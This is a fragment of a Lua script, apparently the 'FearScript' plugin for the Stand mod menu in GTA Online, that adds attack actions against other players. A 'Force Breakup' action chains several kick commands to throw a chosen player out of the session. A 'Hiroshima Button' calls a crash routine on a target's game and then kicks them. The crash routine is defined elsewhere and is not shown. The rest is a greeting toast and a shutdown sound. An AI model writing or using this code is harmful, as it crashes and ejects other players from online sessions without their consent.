        FearAttackList:action("Force Breakup ".. FearPlayerName, {"forcebreakup"}, "Force "..FearPlayerName.." to leave the session.\nNOTE: You can't kick Stand Users if Stand User Identification has been activated.\nIt will be useful if you want kick Players using Host Spoof Token (Aggressive/Spot) but reverse side.", function()
            FearCommands("breakup"..FearPlayerName)
            FearCommands("kick"..FearPlayerName)
            FearCommands("confusionkick"..FearPlayerName)
            FearCommands("aids"..FearPlayerName)
            FearCommands("orgasmkick"..FearPlayerName)
            FearCommands("nonhostkick"..FearPlayerName)
            FearCommands("pickupkick"..FearPlayerName)
            FearToast(FearScriptNotif.."\n"..FearPlayerName.." has been forced breakup.")
        end, nil, nil, COMMANDPERM_AGGRESSIVE)
        
        FearAttackList:action("Hiroshima Button", {"hiroshimabutton"}, "Do you really want crash "..FearPlayerName.." for the action?\nNOTE: You can might be karma if you try to crash modder or someone else.", function()
            FearToast(FearScriptNotif.."\nNuke Button on " ..FearPlayerName)
            FearBoomCrash(pid, FearPlayerName)
            util.yield(2000)
            if players.get_name(pid) == FearPlayerName then
                menu.trigger_commands("breakup"..FearPlayerName)
                FearToast(FearScriptNotif.."\n"..FearPlayerName.." has been nuked.")
            end
        end, nil, nil, COMMANDPERM_AGGRESSIVE)
    end)

    players.dispatch_on_join()

    players.on_leave(function()
        update_player_count()
    end)

if not SCRIPT_SILENT_START then
    FearToast(FearScriptNotif.."\nHello ".. players.get_name(players.user())..", I hope you will appreciate the script, the script is unstable, so soon, it will gonna be better.")
end

util.on_stop(function()
    local sound_location_1 = join_path(script_store_dir_stop, "stop.wav")
    FearPlaySound(sound_location_1, SND_FILENAME | SND_ASYNC)
end)
